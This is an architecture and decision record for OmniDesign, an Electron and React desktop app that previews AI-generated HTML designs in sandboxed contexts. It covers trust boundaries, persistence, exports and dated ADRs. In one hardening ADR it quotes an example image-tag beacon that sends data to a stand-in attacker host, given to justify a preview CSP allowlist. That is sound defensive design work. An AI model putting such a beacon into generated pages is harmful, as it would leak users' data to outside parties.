# OmniDesign Architecture

This document records the accepted and proposed architecture for OmniDesign. It is subordinate to the product principles in `AGENTS.md`, but it is the authoritative source for technical direction. Future architectural changes must update this document and record why the decision changed.

## Decision Status

The following decisions are accepted:

- OmniDesign begins as a cross-platform desktop application.
- The desktop shell is Electron.
- The application UI is built with React and TypeScript.
- Vite is used to develop and build the React renderer.
- pnpm is the workspace package manager.
- Privileged desktop capabilities live outside the React renderer and are exposed through narrow, typed IPC contracts.
- The initial product is local-first and stores projects, designs, threads, and history on disk.
- AI-generated designs are rendered in an isolated, unprivileged Chromium context.
- The codebase is organized as a modular monorepo with portable domain and UI packages where practical.
- The trusted application UI follows the visual, interaction, component, and accessibility rules in `DESIGN_SYSTEM.md`.
- React Aria Components, installed through `react-aria-components`, is the headless accessibility and interaction foundation for the trusted React UI.
- Heroicons is the default icon family for the trusted React UI.
- Application selection controls use shared, accessible custom combobox or listbox primitives; the trusted UI does not use the built-in HTML `<select>` element.
- The trusted UI is dark-first with a complete user-selectable light theme and bundles Oak Sans v2.0 from `Walven/OakSans` as its primary interface family.
- Phase 1 retains Electron's standard platform window frame and title bar; custom window chrome is deferred.
- Phase 1 structured persistence uses the `node:sqlite` API embedded in Electron's Node.js runtime, with numbered SQL migrations owned by the persistence layer.
- Zod validates privileged IPC request payloads and persisted JSON boundaries at runtime.
- The walking skeleton uses React-owned feature state and explicit service calls; a global state-management dependency will be introduced only when cross-screen background-job coordination demonstrates the need.
- The generated-design preview uses `WebContentsView` in a non-persistent, dedicated session partition and a session-scoped `omnidesign-preview://` protocol handler.
- Phase 1 offline ZIP assembly uses `fflate`, while Tailwind compilation uses the pinned `tailwindcss` and `@tailwindcss/node` packages.
- Completed design history uses immutable file snapshots plus SQLite metadata and pointers; hidden per-design Git repositories are not used in the Phase 1 walking skeleton.

The following generation decision is provisional and must be benchmarked before it becomes final:

- Generated designs use HTML and Tailwind CSS, with Alpine.js as the default minimal interaction layer.
- A bundled compiler produces offline, self-contained or small-folder exports.

The installed-subscription pilot uses locally installed, already authenticated Codex and Claude Code CLIs behind a provider-neutral adapter gateway. It does not store credentials. Phase 3 continues using these provider-owned harnesses. API-key providers, direct provider API integrations, an OmniDesign-owned harness, multiple provider configurations, and setup/testing are deferred to an unassigned provider-infrastructure milestone (product-owner decision, 2026-07-27); see `docs/PROVIDER_SUBSCRIPTION_PILOT.md` for the installed pilot's current scope.

## Architectural Goals

The architecture must optimize for:

- Windows, macOS, and Linux support from the beginning.
- Access to user-installed applications and local development projects.
- Use of user-owned AI subscriptions or API keys for supported providers.
- Fast, approachable development in a TypeScript-centered toolchain.
- High-fidelity rendering of web-native designs.
- Strong isolation of AI-generated code from privileged desktop capabilities.
- Local operation without requiring an OmniDesign cloud service.
- Transparent, portable design exports.
- A credible future mobile and web path without compromising the initial desktop experience.
- Modularity, testability, and replaceable infrastructure.

## Why a Desktop Application

Phase 1 requires OmniDesign to integrate with installed applications and existing user subscriptions. A normal webpage cannot directly and generally launch local subprocesses, inspect development projects, or communicate with installed tools without an additional local bridge.

A web application could use a companion daemon, browser extension, local server, or custom protocol handler, but that would still require installing and securing a desktop component. It would add a second deployment model before cloud features exist. The initial product therefore uses a desktop shell while keeping the renderer web-based so a future browser client can reuse appropriate packages.

## Desktop Technology Decision

### Electron

Electron is the accepted desktop shell because OmniDesign's primary artifact is HTML. Electron provides:

- A consistent bundled Chromium renderer across Windows, macOS, and Linux.
- A Node.js main process capable of controlled filesystem, subprocess, window, menu, protocol, and operating-system integration.
- A web-standard renderer suitable for a polished React interface.
- Strong alignment between the application UI, the design preview environment, browser developer tooling, and eventual web clients.
- A mature packaging and distribution ecosystem.

The larger binary and memory footprint are accepted tradeoffs. Rendering consistency and implementation simplicity are more important for this product than minimizing the installed desktop shell.

### Alternatives Considered

#### Tauri 2

Tauri is the strongest alternative. It supports web frontends, desktop and mobile targets, smaller binaries, scoped permissions, and native integrations. It was not selected because:

- It uses platform WebViews rather than one bundled Chromium engine, which can create rendering differences between WebView2, WKWebView, and WebKitGTK.
- Rust and platform-specific plugins add complexity to ordinary feature development.
- Installed-tool and subprocess integrations are more direct in Electron's Node.js main process.
- Mobile support is desirable but is not important enough to choose a less convenient desktop foundation.

Reconsider Tauri only if binary size or a single desktop/mobile runtime becomes more important than rendering consistency and development speed.

#### .NET MAUI and Blazor Hybrid

.NET MAUI provides C#, native mobile targets, Windows, and macOS, but it does not provide an official Linux desktop target. Its platform WebViews and split web/native toolchain are a less natural fit for an HTML-centered design tool.

#### Avalonia

Avalonia provides strong cross-platform .NET desktop coverage and some mobile and WebAssembly support. Its native/Skia UI model does not provide a meaningful advantage for an application that creates and previews HTML, and its mobile support is not the primary architecture driver.

#### React Native

React Native has a strong mobile story, but desktop support adds separate Windows and macOS implementations. It also does not render a normal HTML DOM, so OmniDesign would need both a native UI system and a separate WebView-based design system. This is the wrong abstraction for the primary product.

#### Flutter

Flutter offers polished cross-platform applications and mobile support, but its canvas-based UI and Dart toolchain would create a second rendering model beside the generated HTML designs.

## Application Technology

### React and TypeScript

The trusted OmniDesign interface is written with React and TypeScript. React is the application UI framework; TypeScript is used across the renderer, desktop contracts, domain logic, and Node.js infrastructure wherever practical.

Generated designs do not automatically use React. The framework used to build OmniDesign and the framework used in generated artifacts are separate decisions.

### React Aria Components

The trusted application UI uses React Aria Components as the behavior layer beneath OmniDesign's own design-system components.

- Install the style-free `react-aria-components` package, not the styled React Spectrum or Spectrum 2 component packages.
- Begin with its high-level components and use lower-level React Aria hooks only when an OmniDesign interaction cannot be expressed cleanly through the component API.
- Wrap third-party primitives behind components owned by `packages/design-system` or `packages/ui`; feature code should normally consume OmniDesign components rather than importing React Aria directly.
- OmniDesign owns all visual styling, semantic tokens, variants, composition rules, icons, and product-specific behavior.
- Use React Aria for complex interaction foundations including comboboxes, listboxes, menus, dialogs, popovers, tooltips, tabs, toolbars, selectable collections, form controls, drag and drop, and focus management.
- Do not combine overlapping headless primitive libraries without an explicit architecture change. A single behavior foundation avoids inconsistent focus, overlay, keyboard, and state conventions.
- This dependency applies only to the trusted React renderer. It must not be injected into or required by AI-generated designs and does not alter the isolated-preview boundary.

Pin the dependency version when the workspace is scaffolded and verify its documented behavior with the Electron-bundled Chromium version, Windows keyboard conventions, screen readers, forced-colors mode, and automated component tests.

### Vite

Vite is the development server and production build tool for the React renderer. It is not a backend, cloud service, or runtime dependency for users.

During development:

```text
React and TypeScript source
          |
          v
Vite development server and hot reload
          |
          v
Electron renderer window
```

For packaged applications:

```text
React and TypeScript source
          |
          v
Vite production build
          |
          v
Static HTML, CSS, and JavaScript bundled into Electron
```

Vite must not process or control the AI-generated design artifacts. Generated designs have a separate preview and export pipeline.

## Process and Trust Boundaries

The application is divided into explicit trust zones.

### Electron Main Process

The main process owns privileged operations:

- Application lifecycle and native windows.
- Filesystem access and project directory watching.
- Installed-application and subprocess integration.
- Local persistence and migrations.
- Native menus, dialogs, protocols, and operating-system features.
- Provider orchestration that requires local privileges.
- Creation and policy enforcement for isolated preview contexts.

The main process must not contain UI feature logic that belongs in the renderer or domain packages.

### Preload and IPC Boundary

The trusted renderer must not receive Node.js or Electron APIs directly. A preload bridge exposes a narrow, typed application API.

- Use explicit request and event contracts.
- Validate every payload at runtime as well as at compile time.
- Validate the sender of privileged messages.
- Do not expose generic `send`, filesystem, shell, or subprocess functions.
- Keep IPC contracts in a dedicated shared package.
- Test authorization, validation, error handling, and cancellation behavior.

### Trusted React Renderer

The React renderer owns:

- Conversation and history UI.
- Project and design navigation.
- High-level design controls.
- Preview framing and user interaction around the preview.
- State presentation and optimistic UI where appropriate.
- Accessibility and the established OmniDesign visual language.

It requests privileged operations only through the typed preload API.

### Generated Design Preview

AI-generated HTML, CSS, and JavaScript are untrusted code even when produced locally. Generated designs must run outside the trusted React renderer in an isolated Chromium context configured with:

- Node.js integration disabled.
- Context isolation enabled.
- Process sandboxing enabled.
- No preload bridge.
- A separate session partition.
- No direct filesystem or project access.
- Navigation and new-window creation denied by default.
- Permission requests denied by default.
- Network access denied or restricted by an explicit allowlist.
- A restrictive Content Security Policy.
- A safe custom protocol rather than unrestricted `file://` access.

The preview must never receive the trusted application IPC bridge. Any preview communication must use a separate, minimal protocol with validated messages. Keep Electron current so Chromium and Electron security fixes reach users promptly.

## Logical Architecture

```text
React application UI
        |
        v
Typed preload API and validated IPC
        |
        v
Electron main process
   |         |             |
   v         v             v
Providers  Persistence   Project integration
   |         |             |
   v         v             v
Installed  SQLite and    Local repositories
tools      design files  and filesystem

React UI --------> isolated generated-design preview
                         X
                         |
              no privileged application bridge
```

## Repository Shape

The initial monorepo should move toward this structure without creating empty abstraction layers before they are needed:

```text
apps/
  desktop/
    main/
    preload/
    renderer/

packages/
  domain/
  ui/
  design-system/
  ipc-contracts/
  provider-contracts/
  providers/
  persistence/
  project-context/
  design-runtime/
  design-export/
  testing/
```

Responsibilities must remain narrow. Do not create a large shared package that becomes a dumping ground, and do not introduce packages whose boundaries are not yet meaningful.

## Provider Architecture

Codex, Claude, and future providers must sit behind provider-neutral contracts. Provider-specific behavior belongs in adapters.

The abstraction must account for:

- Installed subscription integrations where the provider supports them.
- API-key integrations where applicable.
- Streaming text and structured events.
- Tool invocation and cancellation.
- Conversation continuation and provider-specific identifiers.
- Usage, error, and capability reporting.
- Provider capability differences without reducing every provider to the lowest common denominator.

The current installed-subscription mechanism and its limitations are recorded in `docs/PROVIDER_SUBSCRIPTION_PILOT.md`. Upstream orchestration uses one normalized gateway for discovery, prompts, replies, and streamed activity; provider-specific process protocols and event parsing remain inside adapters.

## Local-First Persistence

Cloud services are a later roadmap phase. Phase 1 saves designs and threads locally.

Use a hybrid persistence model:

- SQLite for structured entities, relationships, indexes, thread messages, generation events, history pointers, migrations, and configuration metadata.
- Ordinary files for HTML, CSS, JavaScript, images, fonts, generated assets, thumbnails, and immutable design snapshots.
- Operating-system credential storage for secrets if OmniDesign ever needs to persist API keys or credentials.
- An optional project-local `.omnidesign/` directory or user-selected design directory for artifacts that should travel with a development project.
- Application-local storage for private threads, indexes, caches, settings, and data that should not automatically enter Git.

Do not store secrets in project files or the ordinary SQLite database.

### Phase 1 Persistence Implementation

The initial implementation uses Electron 43's embedded Node 24 runtime and its built-in `node:sqlite` module. This avoids a separately compiled native SQLite addon while preserving the accepted SQLite data model. The persistence package owns explicit, forward-only migrations and opens databases with foreign-key enforcement and WAL journaling. Tests use temporary directories and isolated databases.

Immutable revision artifacts remain ordinary files beneath OmniDesign-managed application storage. SQLite stores their metadata and paths, active and selected revision pointers, conversations, drafts, layout state, and project/design relationships. The source-project directory is never used as the design working directory.

The walking skeleton makes this concrete beneath Electron's application data directory:

```text
workspace/
  omnidesign.sqlite
  designs/
    <design-id>/
      revisions/
        <revision-id>/
          index.html
```

Revision directories are append-only. Restoration copies the selected snapshot into a new revision whose parent is the previous head. SQLite retains the active and selected pointers, so later history is never deleted or rewritten. This describes the completed walking skeleton's snapshot store; agent-backed design workspaces use the additional Git-backed model below.

### Agent Harness Design Workspaces

Each agent-backed design has a self-contained Git repository in OmniDesign-managed storage. It is a normal working repository for the provider harness, not a repository the user is required to manage. Before an agent starts, OmniDesign creates the repository and prepares its `index.html` entry page.

The provider harness starts the agent in that design repository. The agent may inspect and edit the design as it would any other project. When the design is associated with an existing project, the original project is supplied separately as an explicit read-only reference; it is never the agent's working directory and the harness grants it no write authority.

Git, not an agent-authored file inventory, determines whether the working tree changed and records the resulting design revision. The prepared `index.html` is the fixed preview/export entry page, so the agent does not choose or report an entry point. Completed revisions continue to be represented by immutable application metadata and non-destructive restoration; implementation may create a new commit from a restored state rather than rewriting history.

After execution, the agent returns a validated JSON completion payload. It includes a `response` field containing the agent's conversational reply to the user. A response does not imply that the design changed or that a new revision exists. OmniDesign then builds the persisted completion record from independent evidence: Git state for change detection, harness and validation tooling for validation results and diagnostics, and the provider adapter for usage and cost when available. The remaining agent-payload schema is intentionally pending product definition. Neither the payload nor the persisted record may use agent claims to declare changed files or select the entry page.

If Electron moves to a Node release where `node:sqlite` compatibility or support changes materially, re-evaluate this choice before upgrading Electron rather than silently replacing the persistence layer.

### History Model

History should be append-only or revision-based from the beginning:

- Preserve prompts, results, relevant tool actions, and design revisions.
- Store immutable design snapshots or content-addressed artifacts where practical.
- Maintain explicit pointers to the current revision rather than mutating away previous states.
- Make restoration deterministic.
- Keep the model compatible with Phase 4 design branching and merging.

## Generated Design Architecture

### Guiding Principle

The AI should generate against conventions that are common in its training data. Do not invent a large OmniDesign-specific UI language before measuring whether it improves results.

The provisional default is:

- Semantic HTML for document structure.
- Tailwind CSS for styling, responsive behavior, and design tokens.
- Alpine.js for minimal declarative interactivity.
- Small, explicit JavaScript modules for behavior that is too complex for readable Alpine expressions.

This keeps generated source close to ordinary HTML while using popular conventions that AI models are likely to handle reliably.

### Tailwind CSS

Tailwind is provisionally preferred because it provides:

- A widely represented vocabulary for AI-generated interfaces.
- Consistent spacing, typography, layout, responsive, and interaction-state utilities.
- A compilation path that emits only the CSS needed by the generated pages.
- Theme variables that align with project-level design definitions in Phase 3.
- Zero Tailwind runtime in precompiled exports.

Project design definitions should be represented through Tailwind theme variables and regular CSS custom properties as appropriate. Prefer semantic tokens such as `primary`, `surface`, and `muted` over coupling components to literal palette values.

Generated Tailwind class names must appear as complete, statically detectable strings. Do not construct class names dynamically from fragments because the Tailwind compiler cannot reliably discover them.

When OmniDesign works inside an existing project, the generator should adopt the project's established design language and Tailwind configuration if present. Tailwind remains a standalone default, not a reason to rewrite a project that uses another system.

### Alpine.js

Alpine is the provisional interaction layer because it supports state and events directly in HTML without imposing a virtual DOM or component build pipeline.

Use Alpine for minimal prototype interactions such as:

- Tabs.
- Dialogs.
- Menus and dropdowns.
- Accordions.
- Toggles.
- Filtering and small local state changes.
- Simple transitions.

Prefer native accessible HTML behavior where it is sufficient. Keep Alpine expressions short and readable. Move complex state or logic into named modules rather than embedding large programs in attributes.

Bundle and pin Alpine with OmniDesign. Use Alpine's CSP-compatible build in the isolated preview so the application does not need to weaken its preview Content Security Policy for ordinary Alpine expressions.

### Stable Editing Metadata

Use stable `data-od-*` identifiers on meaningful regions, components, and editable elements where they improve focused AI edits. They must:

- Remain stable across unrelated edits.
- Carry identifiers rather than application privileges or sensitive data.
- Avoid replacing semantic HTML and meaningful class names.
- Be removable during export when a clean-output option is selected.

## Generated Design Working Format

Keep the editable working representation modular even when the final artifact is one file:

```text
design/
  design.json
  theme.css
  pages/
    home.html
    settings.html
  scripts/
    home.js
  assets/
```

`design.json` should be a versioned manifest that records page identities, file relationships, asset references, schema version, and metadata needed for preview and history. It must not become an opaque replacement for HTML.

Generated pages should:

- Use semantic HTML and accessible native controls.
- Use meaningful class names where custom classes are required.
- Avoid inline styles except for deliberately dynamic values.
- Avoid inline event-handler attributes such as `onclick`.
- Avoid external scripts, trackers, and network calls unless explicitly requested and authorized.
- Reference local or embedded assets by default.
- Be responsive by default.
- Include keyboard, focus, reduced-motion, and contrast considerations.
- Render without requiring the user to install Node.js or project dependencies.

## Preview and Export Pipeline

The working files and the exported artifact are intentionally different representations.

```text
Generated HTML, Tailwind theme, Alpine, and local assets
                           |
                           v
Validation and Tailwind compilation
                           |
                           v
Isolated preview and automated checks
                           |
                           v
Self-contained HTML or portable static folder
```

### Default Export Modes

#### Self-Contained

- One HTML file per design page, or one HTML file for a single-page design.
- Inline the compiled Tailwind CSS.
- Inline the pinned Alpine runtime and page-specific JavaScript when used.
- Inline small assets when practical.
- Require no network access or build step.

#### Portable Folder

- One or more HTML pages.
- One shared compiled CSS file.
- One shared pinned runtime file when needed.
- An assets directory.
- Require no package installation or build step.

#### Quick-Share CDN

- Load pinned Tailwind browser and Alpine builds from approved CDN URLs.
- Clearly state that the result requires internet access.
- Treat this as a convenience or development export, not the production-quality default.

Tailwind's Play CDN is explicitly intended for development and must not be the default export. The normal exporter precompiles Tailwind into static CSS using a compiler bundled with OmniDesign.

## Generation Validation Loop

Framework familiarity alone does not maximize AI performance. Each generation should pass through a render-inspect-repair loop that can provide the model with:

- The generation contract and current design tokens.
- Relevant existing-project styles and component examples.
- Browser console, parsing, and compilation errors.
- Screenshots at representative viewport sizes.
- Accessibility findings.
- Overflow, clipping, responsive, and interaction failures.
- Stable identifiers and the relevant source subset for focused edits.

Validate at minimum:

- HTML parsing and document structure.
- Tailwind compilation.
- Browser console errors.
- Disallowed external dependencies and network requests.
- Keyboard accessibility and obvious semantic issues.
- Representative desktop and mobile viewport layouts.
- Exported-file offline behavior.

## Generation Framework Benchmark

Do not finalize the generated-design framework based only on intuition. During Phase 0 or early Phase 1, benchmark at least:

1. HTML, Tailwind CSS, and Alpine.js.
2. React-style components and Tailwind CSS, potentially built against Preact compatibility for a smaller runtime.
3. HTML, Tailwind CSS, and vanilla JavaScript.
4. HTML, ordinary CSS, and vanilla JavaScript as a control.

Use the same providers, prompts, context, iteration limits, and evaluation tasks. Include:

- A marketing or landing page.
- A product dashboard.
- A settings workflow.
- Responsive mobile states.
- A project-wide color and typography change.
- Several focused edits.
- Tabs, a dialog, filtering, and another small interaction.

Measure:

- First-pass parse, build, and render success.
- Visual quality and prompt adherence.
- Focused-edit reliability and unwanted regressions.
- Accessibility and responsive behavior.
- Browser console errors.
- Source readability and maintainability.
- Exported bytes and external dependencies.
- Generation token usage and latency.
- Offline export correctness.

Record the prompts, raw outputs, model and provider versions, compiler versions, measurements, screenshots, and human evaluation criteria so results are reproducible. Promote Tailwind and Alpine from provisional to accepted only if the benchmark supports it. Keep framework-specific generation profiles possible for established projects.

## Testing Strategy

Every architectural layer must be testable:

- Unit tests for domain behavior, history, validation, serialization, and provider-independent orchestration.
- Contract tests for provider adapters.
- Schema and authorization tests for every IPC operation.
- Persistence and migration integration tests against temporary databases and directories.
- React component and interaction tests.
- Preview isolation and navigation-policy tests.
- Export snapshot and offline-execution tests.
- End-to-end Electron tests for critical user journeys.
- Visual regression and accessibility tests for the OmniDesign UI and representative generated designs.

Use Vitest and React Testing Library as the initial unit and component-testing direction. Evaluate Playwright for Electron end-to-end flows while accounting for the maturity of its Electron automation support at implementation time.

Vitest owns domain, persistence, IPC-schema, export, provider-contract, and React component tests in the walking skeleton. Electron security policies are expressed as testable pure functions wherever practical, then covered by an Electron integration test before the walking skeleton is declared complete. React feature code does not import Electron modules; it consumes the typed preload surface.

## Mobile and Web Path

Electron is desktop-only. Future mobile support should not be achieved by forcing the desktop shell onto mobile.

Keep portable:

- Domain entities and validation.
- Provider-neutral contracts.
- Conversation and history models.
- Design-system packages.
- Serialization and export logic where platform-independent.
- React UI and state that do not depend on desktop APIs.
- A future cloud API client.

A future mobile application will likely emphasize review, prompting, commenting, approval, and collaboration rather than invoking applications installed on a desktop computer. Once cloud services exist, it can communicate through the hosted backend.

Because the interface is web-based, Capacitor is the leading future mobile-shell candidate. Do not add it during the desktop phases merely to preserve a hypothetical path. A future web client can reuse portable packages and replace the desktop API implementation with cloud or browser-safe adapters.

## External References

Verify current documentation again before implementation because APIs and platform support change:

- [Electron introduction](https://www.electronjs.org/docs/latest/)
- [Electron process model](https://www.electronjs.org/docs/latest/tutorial/process-model)
- [Electron security guidance](https://www.electronjs.org/docs/latest/tutorial/security)
- [Oak Sans](https://github.com/Walven/OakSans)
- [React Aria](https://react-aria.adobe.com/)
- [Vite guide](https://vite.dev/guide/)
- [Tailwind CLI](https://tailwindcss.com/docs/installation/tailwind-cli)
- [Tailwind Play CDN](https://tailwindcss.com/docs/installation/play-cdn)
- [Tailwind theme variables](https://tailwindcss.com/docs/theme)
- [Tailwind class detection](https://tailwindcss.com/docs/detecting-classes-in-source-files)
- [Alpine installation](https://alpinejs.dev/essentials/installation)
- [Alpine CSP build](https://alpinejs.dev/advanced/csp)
- [Preact](https://preactjs.com/)
- [Tauri](https://v2.tauri.app/start/)
- [Capacitor](https://capacitorjs.com/docs)

## Phase 2 Architecture Decisions

### ADR 2026-07-24: Pages are discovered from Git (accepted, implemented)

A design is one Git repository that may contain multiple pages. Every `*.html`
file committed outside the managed `.build/` directory is a page; there is no
page manifest and the agent never declares pages or an entry point. `index.html`
is the home page when present, otherwise the first discovered page; a per-design
`entry_page_path` preference can override it. A revision remains a single
whole-design commit.

This reverses the Phase 1 working assumption that a design was effectively a
single `index.html` (see the deferred multi-file note in the Phase 1 audit).
`readRevisionFiles` now reads every committed file via `git ls-tree`, so
agent-authored assets, fonts, and per-page scripts flow through both the preview
and the offline export. Tailwind compiles once across all pages into one shared
`.build/tailwind.css`. Lightweight per-path page metadata (display title, order)
lives in `design_pages`. Implemented in `designRepository.ts`, `compiler.ts`,
`pages.ts`, `exportService.ts`, and store migration 29.

### ADR 2026-07-24: Canvas preview via sandboxed iframes (accepted, implemented)

Phase 1 rendered the preview in an isolated native `WebContentsView`. A canvas
mode that lays every page out on one pan/zoom board needs an in-DOM surface, so
the preview is now one sandboxed `<iframe sandbox="allow-scripts">` per page
(opaque origin, no `allow-same-origin`) served over the `omnidesign-preview://`
scheme with the restrictive preview CSP, plus an OmniDesign-injected shim
(`previewShim.ts`) for content height, diagnostics forwarding, and current-page
reporting. `previewServer.ts` registers the scheme on the default session and
serves each revision's files by opaque token.

A standalone Electron 43 harness validated the load-bearing assumptions before
implementation (opaque-origin iframe loads relative `.build/*` subresources
because the CSP uses the scheme source `omnidesign-preview:`, the height shim
round-trips, and `connect-src 'none'` is enforced inside the frame). Two CSP
changes land with it: the preview `frame-ancestors` is relaxed from `'none'` to
the renderer origin (`file:` packaged, the dev origin in development), and the
trusted-renderer CSP gains `frame-src omnidesign-preview:`.

**The product owner cleared the isolation downgrade (2026-07-24).** Relative to
the Phase 1 native view this gives up the
OS-level process sandbox and dedicated session partition while keeping
opaque-origin DOM/storage isolation, denied network egress (`connect-src 'none'`),
the sandbox restrictions (no forms/popups/top-navigation), a `will-frame-navigate`
guard against in-frame navigation to non-preview URLs, and the custom-protocol
boundary. Diagnostics forward from the shim to the store; thumbnails are captured
via `capturePage` of the on-screen iframe rect; pop-out opens a sandboxed window
on the preview URL. The native freeze/detach occlusion dance is gone (DOM overlays
paint over iframes naturally).

**Hardening pass — external-resource allowlist (2026-07-27, done).** The preview
CSP previously allowed subresources from any `https:` host, leaving a residual
data-exfiltration channel: a generated (possibly prompt-injected) page could beacon
to an attacker host with a plain resource GET (`<img src="https://attacker/?d=…">`)
even with `connect-src 'none'`. `script-src`/`style-src`/`font-src`/`img-src` are
now restricted to a curated allowlist of well-known font hosts, CDNs, and
placeholder/stock-image services (`PREVIEW_ALLOWED_HOSTS` in `previewPolicy.ts`,
the single source of truth shared by the CSP builder, `isAllowedPreviewResourceUrl`,
and the agent contract in `agentHarness.ts`). A default-session `webRequest` filter
independently enforces the same host list for HTTP(S) requests, while allowing the
exact Vite renderer origin in development. This is possible now that Phase 2 supports
local assets, so designs no longer need arbitrary CDNs.

The Phase 2 hardening floor deliberately does not add a no-op shim nonce: the current
generated-design contract permits inline scripts and Alpine directives, so adding a
nonce source would make conforming browsers ignore `'unsafe-inline'` and break valid
designs. Moving to Alpine's CSP runtime and removing inline/eval behavior would be a
separate generated-runtime decision, not unfinished iframe hardening. An `app://`
renderer migration was considered but is unnecessary for the accepted floor: packaged
embedding is already restricted to `file:`, development to the exact Vite origin, and
the preview scheme is not web-reachable.

### ADR 2026-07-27: Focused preview remains unconstrained (accepted, implemented)

Canvas mode simulates devices and therefore owns the persisted Phone, Tablet, Desktop,
and custom dimensions plus Artboard/Fixed fit. Focused mode is for inspecting and using
one page in all available workspace space; it intentionally fills the preview pane and
does not apply simulated device dimensions. The selected page and view mode still
persist per design.

## Phase 3 Architecture Decisions

### ADR 2026-07-27: Version project definitions and materialize portable tokens (accepted)

Project-level design definitions are immutable versioned records in OmniDesign's
local persistence. A project points to its current version, while each design records
the version it applied or explicitly kept. Saving definitions never mutates completed
design revisions. Applying definitions creates an ordinary Git-backed, validated
revision so historical preview, restoration, and offline export remain deterministic.

Prefer semantic CSS custom properties in ordinary design working files for colors,
typography, spacing, and shape. Exact changes to an unambiguously managed token may be
applied programmatically. Broad source rewriting is forbidden; designs without a safe
managed representation use the existing installed-provider generation pipeline for
migration or interpretation. Linked source projects remain read-only and never receive
OmniDesign's definition files.

### ADR 2026-07-27: Resolve focused selections through immutable source maps (accepted)

Single-element selection extends the Phase 2 sandboxed-iframe preview shim and its
validated `postMessage` channel. When a revision is registered for preview, the
privileged workspace derives an HTML source-location map from the immutable revision.
The untrusted frame reports an opaque location identifier plus bounded display
metadata; it never supplies an authoritative path, line range, revision identifier, or
source excerpt. The privileged side resolves the identifier only against the active
registered revision and returns a validated repository-relative HTML path and inclusive
line range.

Selection is limited to Focused preview mode and the current head. Runtime-created
nodes resolve to the nearest source-authored ancestor when possible. The feature adds
no preload, Node.js access, same-origin permission, filesystem access, or generic IPC
to generated code. Exact target metadata is retained on the submitted message and
generation attempt, while the live selection remains ephemeral.

## Rules for Changing This Architecture

- Distinguish accepted decisions from proposals and experiments.
- Use benchmark results and working spikes for decisions where developer experience, AI quality, rendering, or portability are uncertain.
- Record meaningful changes and their rationale rather than silently replacing prior direction.
- Prefer reversible boundaries over speculative abstraction.
- Do not weaken preview isolation for convenience.
- Do not make the open-source local core depend on future OmniDesign cloud infrastructure.
